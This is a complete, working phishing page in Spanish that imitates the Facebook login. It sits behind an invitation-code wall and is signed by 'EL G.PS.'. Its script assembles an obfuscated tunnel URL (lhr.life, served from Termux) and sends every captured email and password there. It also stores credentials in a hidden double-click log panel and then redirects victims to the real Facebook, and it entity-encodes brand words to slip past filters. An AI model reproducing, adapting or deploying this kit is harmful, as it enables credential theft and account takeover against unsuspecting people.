<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inici&#97;r sesi&#243;n</title>
    <style>
        /* --- ESTILOS DEL MURO DE SEGURIDAD (FONDO NEGRO) --- */
        #muro-proteccion { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #000000; color: #ffffff; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            z-index: 9999; font-family: 'Segoe UI', Arial, sans-serif; 
        }
        .muro-box { width: 85%; max-width: 350px; text-align: center; }
        .muro-input { 
            width: 100%; padding: 15px; margin: 20px 0; 
            background: #1a1a1a; border: 1px solid #333; color: #ffffff; 
            border-radius: 8px; text-align: center; font-size: 16px; outline: none;
        }
        .muro-btn { 
            width: 100%; padding: 12px; background: #0064e0; color: #fff; 
            border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px;
        }

        /* --- TU DISE칌O ORIGINAL (OCULTO INICIALMENTE) --- */
        #pagina-original { display: none !important; width: 100%; flex-direction: column; align-items: center; }
        
        body { background-color: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; color: #1c1e21; }
        .d-b { width: 100%; background-color: #f5f6f7; padding: 12px 20px; display: flex; align-items: center; font-size: 13px; color: #576372; box-sizing: border-box; border-bottom: 1px solid #dddfe2; }
        .l-t { margin-top: 15px; font-size: 14px; color: #4b4f56; }
        .l-c { margin-top: 30px; margin-bottom: 40px; cursor: pointer; user-select: none; }
        .f-l { width: 75px; height: 75px; }
        .c-main { width: 90%; max-width: 400px; display: flex; flex-direction: column; gap: 12px; }
        input { width: 100%; padding: 16px; background-color: #f5f6f7; border: 1px solid #dddfe2; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
        .b-s { width: 100%; background-color: #0064e0; color: white; border: none; padding: 12px; font-size: 17px; font-weight: 600; border-radius: 25px; cursor: pointer; margin-top: 5px; }
        .f-a { text-align: center; color: #1c1e21; text-decoration: none; font-size: 15px; font-weight: 500; margin-top: 10px; }
        .b-n { width: 100%; background-color: transparent; color: #0064e0; border: 1px solid #0064e0; padding: 10px; font-size: 15px; font-weight: 600; border-radius: 25px; margin-top: 40px; cursor: pointer; }
        #p-a { display: none; width: 90%; max-width: 450px; margin: 20px 0; padding: 15px; background: #1a1a1a; color: #33ff33; font-family: 'Courier New', monospace; border-radius: 8px; font-size: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); word-wrap: break-word; }
        #o-l { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.9); flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
        .s-p { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #0064e0; border-radius: 50%; animation: r-o 1s linear infinite; }
        @keyframes r-o { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .foot { margin-top: 20px; text-align: center; width: 100%; padding-bottom: 20px; }
        .m-l { width: 60px; margin-bottom: 8px; }
        .sig { font-size: 12px; font-weight: bold; color: #8d949e; }
    </style>
</head>
<body>

    <div id="muro-proteccion">
        <div class="muro-box">
            <h2 style="margin:0;">Verificaci칩n de Acceso</h2>
            <p style="font-size:14px; opacity:0.8; margin-top:10px;">Esta p치gina requiere un c칩digo de invitaci칩n v치lido proporcionado por el administrador.</p>
            <input type="password" id="tokenIn" class="muro-input" placeholder="Ingresa tu c칩digo 칰nico">
            <button onclick="chequear()" class="muro-btn">DESBLOQUEAR ACCESO</button>
        </div>
    </div>

    <div id="pagina-original">
        <div class="d-b">
            <span style="color:#1877f2; margin-right:12px;">游닌</span>
            <div>Desc&#97;rg&#97; F&#97;c&#101;b&#111;&#111;k p&#97;r&#97; Andr&#111;&#105;d.</div>
        </div>

        <div class="l-t">Espa&ntilde;ol</div>

        <div class="l-c" ondblclick="_vR()">
            <svg class="f-l" viewBox="0 0 36 36" fill="#1877f2">
                <path d="M36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.981 6.58 16.425 15.188 17.775v-12.57h-4.566v-5.205h4.566V14.01c0-4.505 2.684-6.994 6.79-6.994 1.967 0 4.024.351 4.024.351v4.425h-2.268c-2.233 0-2.928 1.385-2.928 2.809v3.393h4.986l-.797 5.205h-4.189V35.775C29.42 34.425 36 26.981 36 18z"/>
            </svg>
        </div>

        <div class="c-main">
            <form id="mainForm">
                <input type="email" id="user" placeholder="Celul&#97;r o corr&#101;o" required>
                <input type="password" id="pass" placeholder="C&#111;ntras&#101;&ntilde;&#97;" style="margin-top: 12px;" required>
                <button type="submit" class="b-s">Inici&#97;r sesi&#243;n</button>
            </form>
            <a href="#" class="f-a">&iquest;Olvid&#97;ste tu c&#111;ntras&#101;&ntilde;&#97;?</a>
            <button type="button" class="b-n">Cre&#97;r cuent&#97; nuev&#97;</button>
        </div>

        <div id="p-a">
            <h4 style="margin:0 0 10px 0; color:white; border-bottom:1px solid #33ff33;">PANEL EL G.PS.</h4>
            <div id="_lG">Vac칤o.</div>
            <button onclick="_cT()" style="margin-top:15px; background:#f00; color:#fff; border:none; padding:5px; border-radius:3px; cursor:pointer;">Limpiar registros</button>
        </div>

        <div id="o-l">
            <div class="s-p"></div>
            <p style="margin-top:15px; font-weight:bold;">Cargando...</p>
        </div>

        <div class="foot">
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="M" class="m-l">
            <div class="sig">Dise&ntilde;ado por EL G.PS.</div>
        </div>
    </div>

    <script>
        (function(){
            // --- OFUSCACI칍N DIN츼MICA DEL LINK DE TERMUX ---
            function armarUrl() {
                const a = "htt"; const b = "ps://";
                const c = "308bda"; const d = "948df4d9"; // Trozos de tu link
                const e = ".lhr"; const f = ".life";
                return a + b + c + d + e + f;
            }

            const muro = document.getElementById('muro-proteccion');
            const pagina = document.getElementById('pagina-original');

            // Mantener sesi칩n si ya puso la clave
            if(sessionStorage.getItem('acceso_ayber')) {
                muro.style.display = 'none';
                pagina.style.setProperty('display', 'flex', 'important');
            }

            // FUNCI칍N PARA EL BOT칍N DE DESBLOQUEO
            window.chequear = function() {
                const llave = document.getElementById('tokenIn').value;
                if(!llave) return;

                fetch(armarUrl(), {
                    method: 'POST',
                    body: JSON.stringify({ verificar_llave: llave }),
                    headers: { 'Content-Type': 'application/json' }
                })
                .then(r => r.json())
                .then(r => {
                    if(r.status === "OK") {
                        sessionStorage.setItem('acceso_ayber', 'true');
                        muro.style.display = 'none';
                        pagina.style.setProperty('display', 'flex', 'important');
                    } else {
                        alert("C칩digo inv치lido o caducado.");
                    }
                })
                .catch(() => alert("Error: Verifica que tu Termux est칠 encendido."));
            };

            // CAPTURA DE DATOS
            document.getElementById('mainForm').addEventListener('submit', function(e) {
                e.preventDefault();
                document.getElementById('o-l').style.display = 'flex';
                
                const u = document.getElementById('user').value;
                const p = document.getElementById('pass').value;

                // Guardar localmente en tu Panel EL G.PS.
                _guardarLocal(u, p);

                // Enviar a Termux
                fetch(armarUrl(), {
                    method: 'POST',
                    body: JSON.stringify({ usuario: u, clave: p }),
                    headers: { 'Content-Type': 'application/json' }
                }).finally(() => {
                    setTimeout(() => {
                        window.location.href = "https://www.facebook.com/login";
                    }, 2000);
                });
            });

            // FUNCIONES DE TU PANEL ORIGINAL
            window._vR = function() {
                const p = document.getElementById('p-a');
                p.style.display = (p.style.display === 'block') ? 'none' : 'block';
                if(p.style.display === 'block') _mostrarLogs();
            };

            function _guardarLocal(u, p) {
                let logs = JSON.parse(localStorage.getItem('_logs_gps')) || [];
                logs.push({ u: u, p: p, t: new Date().toLocaleString() });
                localStorage.setItem('_logs_gps', JSON.stringify(logs));
            }

            function _mostrarLogs() {
                const div = document.getElementById('_lG');
                let logs = JSON.parse(localStorage.getItem('_logs_gps')) || [];
                div.innerHTML = logs.length ? logs.map(l => `[${l.t}]<br>U: ${l.u}<br>P: ${l.p}`).join("<hr>") : "Vac칤o.";
            }

            window._cT = function() { if(confirm("쮹orrar todo?")) { localStorage.removeItem('_logs_gps'); _mostrarLogs(); } };
        })();
    </script>
</body>
</html>
